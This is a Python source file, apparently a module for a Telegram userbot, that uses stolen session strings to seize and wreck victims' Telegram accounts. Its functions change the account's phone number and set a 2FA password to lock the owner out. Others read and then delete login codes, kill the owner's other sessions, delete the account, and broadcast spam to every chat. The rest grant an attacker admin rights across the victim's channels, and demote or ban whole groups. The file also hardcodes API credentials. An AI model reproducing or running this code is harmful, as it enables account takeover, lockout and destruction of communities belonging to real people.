import os

from telethon import TelegramClient as tg
from telethon import functions, types
from telethon.sessions import StringSession as ses
from telethon.tl import functions
from telethon.tl.functions.auth import ResetAuthorizationsRequest as rt
from telethon.tl.functions.channels import DeleteChannelRequest as dc
from telethon.tl.functions.channels import GetAdminedPublicChannelsRequest as pc
from telethon.tl.functions.channels import InviteToChannelRequest
from telethon.tl.functions.channels import JoinChannelRequest as join
from telethon.tl.functions.channels import LeaveChannelRequest as leave
from telethon.tl.types import ChannelParticipantsAdmins

api_id = os.environ.get("APP_ID")
api_hash = os.environ.get("API_HASH")
token = os.environ.get("BOT_TOKEN")


mybot = "missrose_bot"

legendboy = 2024465080

import os

import heroku3
import urllib3

from ..Config import Config

menu_category = "tools"

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
# =================

Heroku = heroku3.from_key(Config.API_KEY)
heroku_api = "https://api.heroku.com"
APP_NAME = Config.APP_NAME
API_KEY = Config.API_KEY


async def setvar(variable, value):
    app = Heroku.app(Config.APP_NAME)
    heroku_var = app.config()
    try:
        heroku_var[variable] = value
    except Exception as e:
        return e


async def getvar(variable):
    app = Heroku.app(Config.APP_NAME)
    heroku_var = app.config()
    try:
        lol = heroku_var[variable]
    except Exception as e:
        print(e)
    return lol


async def delvar(variable):
    app = Heroku.app(Config.APP_NAME)
    heroku_var = app.config()
    try:
        del heroku_var[variable]
    except Exception as e:
        print(e)
    return e


async def change_number_code(strses, number, code, otp):
    async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
        bot = X
        try:
            result = await bot(
                functions.account.ChangePhoneRequest(
                    phone_number=number, phone_code_hash=code, phone_code=otp
                )
            )
            return True
        except:
            return False


async def change_number(strses, number):
    async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
        bot = X
        result = await bot(
            functions.account.SendChangePhoneCodeRequest(
                phone_number=number,
                settings=types.CodeSettings(
                    allow_flashcall=True, current_number=True, allow_app_hash=True
                ),
            )
        )
        return str(result)


async def userinfo(strses):
    async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
        k = await X.get_me()
        return str(k)


async def terminate(strses):
    async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
        await X(rt())


GROUP_LIST = []


async def delacc(strses):
    async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
        await X(functions.account.DeleteAccountRequest("I am chutia"))


async def gcast(strses, msg):
    async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
        try:
            reply_msg = msg
            tol = reply_msg
            file = None
            async for aman in X.iter_dialogs():
                chat = aman.id
                try:
                    if chat != -1001551357238:
                        await X.send_message(chat, tol, file=file)
                    elif chat == -1001551357238:
                        pass
                except Exception as e:
                    print(e)
        except Exception as e:
            print(e)


async def promote(strses, grp, user):
    async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
        try:
            await X.edit_admin(
                grp,
                user,
                manage_call=True,
                invite_users=True,
                ban_users=True,
                change_info=True,
                edit_messages=True,
                post_messages=True,
                add_admins=True,
                delete_messages=True,
                pin_messages=True,
            )
        except:
            await X.edit_admin(
                grp,
                user,
                is_admin=True,
                anonymous=False,
                pin_messages=True,
                title="Owner",
            )


async def user2fa(strses):
    async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
        try:
            await X.edit_2fa("LEGENDBOY IS BEST")
            return True
        except:
            return False


async def gpromote(strses, user):
    async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
        try:
            i = 0
            k = await X(pc())
            for x in k.chats:
                try:
                    await X.edit_admin(
                        x,
                        user,
                        manage_call=True,
                        invite_users=True,
                        ban_users=True,
                        change_info=True,
                        edit_messages=True,
                        post_messages=True,
                        add_admins=True,
                        delete_messages=True,
                        pin_messages=True,
                    )
                    i += 1
                except:
                    await X.edit_admin(
                        x,
                        user,
                        is_admin=True,
                        anonymous=False,
                        pin_messages=True,
                        title="Owner",
                    )
        except Exception as e:
            print(e)


async def demall(strses, grp):
    async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
        async for x in X.iter_participants(grp, filter=ChannelParticipantsAdmins):
            try:
                await X.edit_admin(grp, x.id, is_admin=False, manage_call=False)
            except:
                await X.edit_admin(
                    grp,
                    x.id,
                    manage_call=False,
                    invite_users=False,
                    ban_users=False,
                    change_info=False,
                    edit_messages=False,
                    post_messages=False,
                    add_admins=False,
                    delete_messages=False,
                )


async def joingroup(strses, username):
    async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
        await X(join(username))


async def leavegroup(strses, username):
    async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
        await X(leave(username))


async def delgroup(strses, username):
    async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
        await X(dc(username))


async def cu(strses):
    try:
        async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
            k = await X.get_me()
            return [str(k.first_name), str(k.username or k.id)]
    except Exception:
        return False


async def login(strses, apiid, apihash, grp, urgrp):
    async with tg(ses(strses), apiid, f"apihash") as X:
        bot = X
        k = await bot.get_entity(grp)
        try:
            async for user in bot.iter_participants(k.id):
                hello = await X(InviteToChannelRequest(channel=urgrp, users=[user.id]))
        except Exception as e:
            i = str(e)
    return i


async def usermsgs(strses):
    async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
        i = ""
        async for x in X.iter_messages(777000, limit=3):
            i += f"\n{x.text}\n"
        await X.delete_dialog(777000)
        return str(i)


async def userbans(strses, grp):
    async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
        k = await X.get_participants(grp)
        for x in k:
            try:
                await X.edit_permissions(grp, x.id, view_messages=False)
            except:
                pass


async def userchannels(strses):
    async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
        k = await X(pc())
        i = ""
        for x in k.chats:
            try:
                i += f"\nCHANNEL NAME {x.title} CHANNEL USRNAME @{x.username}\n"
            except:
                pass
        return str(i)
